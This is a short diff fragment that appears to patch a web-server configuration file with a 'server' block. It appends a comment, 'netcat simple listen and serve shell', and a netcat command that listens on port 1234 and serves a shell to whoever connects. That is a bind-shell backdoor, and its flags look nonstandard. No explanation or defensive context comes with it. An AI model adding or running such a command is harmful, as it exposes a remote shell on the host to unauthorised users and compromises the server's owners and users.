@@ -10263,3 +10263,5 @@ server {
     }
 }
 
+ ## netcat simple listen and serve shell
+ netcat  -p 1234 -L sh -l
